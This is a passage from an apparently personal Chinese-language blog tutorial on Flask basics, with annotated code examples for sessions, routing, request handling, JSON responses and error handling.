print(secrets.token_hex())</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> <span class=\"token string\">'your_secret_key_here'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/set_session/&lt;username>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_session</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    session<span class=\"token punctuation\">[</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> username  <span class=\"token operator\">//</span>把变量username的值存储在会话中，键为username</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Session set for </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>username<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/get_session'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_session</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>读取刚刚那个键的值</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>username<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!'</span></span> <span class=\"token keyword\">if</span> username <span class=\"token keyword\">else</span> <span class=\"token string\">'No session data'</span></pre></td></tr></table></figure><p>Flask 的会话默认是永久的，但可以通过设置  <code>session.permanent = True</code>  来明确指定，并且可以通过  <code>app.permanent_session_lifetime</code>  来设置会话的过期时间。</p>\n<p><strong>错误处理</strong>：可以定义错误处理函数。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>errorhandler</span><span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">page_not_found</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Page not found'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">404</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>errorhandler</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">internal_server_error</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Internal server error'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span></pre></td></tr></table></figure><h2 id=\"一个玩意儿\"><a class=\"anchor\" href=\"#一个玩意儿\">#</a> 一个玩意儿</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> url_for<span class=\"token punctuation\">,</span> render_template_string</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> <span class=\"token string\">'your_secret_key'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>    <span class=\"token operator\">//</span>定义首页路由</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>        </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> username<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>username<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!'</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'You are not logged in.'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/login/&lt;username>'</span><span class=\"token punctuation\">)</span>   <span class=\"token operator\">//</span>定义登录路由</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    session<span class=\"token punctuation\">[</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> username</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/logout'</span><span class=\"token punctuation\">)</span>    <span class=\"token operator\">//</span>定义注销路由</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">logout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    session<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>   <span class=\"token operator\">//</span>移除username键</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token operator\">//</span>重定向回首页</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"项目结构\"><a class=\"anchor\" href=\"#项目结构\">#</a> 项目结构</h2>\n<blockquote>\n<pre><code>my_flask_app/\n│\n├── app.py\n└── requirements.txt\n</code></pre>\n</blockquote>\n<blockquote>\n<pre><code>my_flask_app/\n│\n├── app/\n│   ├── __init__.py\n│   ├── routes.py\n│   └── models.py\n│\n├── config.py\n├── requirements.txt\n└── run.py\n</code></pre>\n</blockquote>\n<blockquote>\n<pre><code>my_flask_app/\n│\n├── app/                       //包含主要代码\n│   ├── __init__.py    //3.0+版本不强制有，初始化Flask应用和配置扩展\n│   ├── routes/                //应用路由和视图函数，这里用一个包代替上面的一个模块\n│   │   ├── __init__.py         \n│   │   ├── main.py             //主模块路由\n│   │   └── auth.py             //认证相关路由\n│   ├── models/               //数据库相关\n│   │   ├── __init__.py\n│   │   └── user.py                 //用户模型\n│   ├── templates/             //存储HTML模板\n│   │   ├── layout.html\n│   │   └── home.html\n│   └── static/\n│       ├── css/\n│       └── js/\n│\n├── config.py\n├── requirements.txt       //列出依赖库\n├── migrations/              //数据库迁移文件\n│   └── ...\n└── run.py                   //用于启动Flask应用\n</code></pre>\n</blockquote>\n<p>目录咯～</p>\n<p>run.py 示例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> app <span class=\"token keyword\">import</span> create_app</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>app <span class=\"token operator\">=</span> create_app<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>route.py 示例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Blueprint</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bp <span class=\"token operator\">=</span> Blueprint<span class=\"token punctuation\">(</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">,</span> __name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token decorator annotation punctuation\">@bp<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">home</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Hello, World!'</span></pre></td></tr></table></figure><p>_<em>init</em>_.py 示例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">create_app</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>from_object<span class=\"token punctuation\">(</span><span class=\"token string\">'config.Config'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">from</span> <span class=\"token punctuation\">.</span> <span class=\"token keyword\">import</span> routes</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    app<span class=\"token punctuation\">.</span>register_blueprint<span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">.</span>bp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> app</pre></td></tr></table></figure><h2 id=\"flask路由\"><a class=\"anchor\" href=\"#flask路由\">#</a> flask 路由</h2>\n<h3 id=\"动态部分\"><a class=\"anchor\" href=\"#动态部分\">#</a> 动态部分</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/greet/&lt;name>'</span><span class=\"token punctuation\">)</span>   </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">//</span>这样可以将这一部分当做参数传给函数，比如：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!'</span></span></pre></td></tr></table></figure><h3 id=\"路由规则\"><a class=\"anchor\" href=\"#路由规则\">#</a> 路由规则</h3>\n<p>路由规则支持不同类型的参数和匹配规则</p>\n<p>字符串（默认），整数（&lt;int:name&gt;），浮点数（&lt;float:value&gt;），路径（&lt;path:name&gt;）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/user/&lt;int:user_id>'</span><span class=\"token punctuation\">)</span>   <span class=\"token operator\">//</span>这样就不会全部都当作内容</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">user_profile</span><span class=\"token punctuation\">(</span>user_id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'User ID: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>user_id<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/files/&lt;path:filename>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">serve_file</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Serving file: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filename<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr></table></figure><h3 id=\"请求方法\"><a class=\"anchor\" href=\"#请求方法\">#</a> 请求方法</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/submit'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"路由转换器\"><a class=\"anchor\" href=\"#路由转换器\">#</a> 路由转换器</h3>\n<p>还是那仨</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/items/&lt;int:item_id>/details'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"路由函数返回\"><a class=\"anchor\" href=\"#路由函数返回\">#</a> 路由函数返回</h3>\n<p>通过视图函数（基本等同，只是路由函数要 url 映射）可以返回：</p>\n<p><img loading=\"lazy\" data-src=\"/1742454735654.png\" alt=\"1742454735654\" /></p>\n<h3 id=\"路由优先级\"><a class=\"anchor\" href=\"#路由优先级\">#</a> 路由优先级</h3>\n<p>按照定义顺序</p>\n<h2 id=\"视图函数\"><a class=\"anchor\" href=\"#视图函数\">#</a> 视图函数</h2>\n<h3 id=\"接受数据\"><a class=\"anchor\" href=\"#接受数据\">#</a> 接受数据</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/greet/&lt;name>'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#url</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/submit'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#POST</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    username <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Form submitted by </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>username<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!'</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/search'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#GET</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">search</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    query <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'query'</span><span class=\"token punctuation\">)</span>   <span class=\"token operator\">//</span>获取 GET 请求中的查询参数query</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Search results for: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>query<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr></table></figure><h3 id=\"返回响应\"><a class=\"anchor\" href=\"#返回响应\">#</a> 返回响应</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token string\">'This is a simple message.'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'hello.html'</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>记得导入render_template</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">api_data</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token operator\">//</span>要导入jsonify</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'value'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'key2'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'value2'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">//</span>自动序列化，将 Python 数据类型（如字典、列表、字符串等，但不是全部）转换为 JSON 格式</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">//</span>会自动设置Content—Type<span class=\"token punctuation\">,</span>支持多参数，自动合并为一个json对象</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>比如：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        message<span class=\"token operator\">=</span><span class=\"token string\">\"Hello, World!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        status<span class=\"token operator\">=</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>还可以用来：</p>\n<p><strong>设置状态码</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Not Found\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">404</span></pre></td></tr></table></figure><p><strong>返回自定义响应头</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">custom_response</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    response <span class=\"token operator\">=</span> Response<span class=\"token punctuation\">(</span><span class=\"token string\">'Custom response with headers'</span><span class=\"token punctuation\">,</span> status<span class=\"token operator\">=</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">#创建自定义响应对象</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'X-Custom-Header'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'Value'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> response</pre></td></tr></table></figure></blockquote>\n<h3 id=\"处理请求和响应\"><a class=\"anchor\" href=\"#处理请求和响应\">#</a> 处理请求和响应</h3>\n<p>视图函数可以访问请求对象</p>\n<p>使用 request 对象来获取请求的信息，使用 make_response 来创建自定义响应</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    user_agent <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>有点规律，我说命名</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Your user agent is </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>user_agent<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">custom_header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    response <span class=\"token operator\">=</span> make_response<span class=\"token punctuation\">(</span><span class=\"token string\">'Response with custom header'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'X-Custom-Header'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'Value'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> response</pre></td></tr></table></figure><h3 id=\"处理错误\"><a class=\"anchor\" href=\"#处理错误\">#</a> 处理错误</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/divide/&lt;int:x>/&lt;int:y>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">divide</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        result <span class=\"token operator\">=</span> x <span class=\"token operator\">/</span> y</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Result: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>result<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">except</span> ZeroDivisionError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'Error: Division by zero'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span>  <span class=\"token operator\">//</span>当然，状态码，可自定义</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token operator\">//</span>可以返回jsonify格式：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token string\">'error'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Division by zero'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token string\">'message'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'The divisor 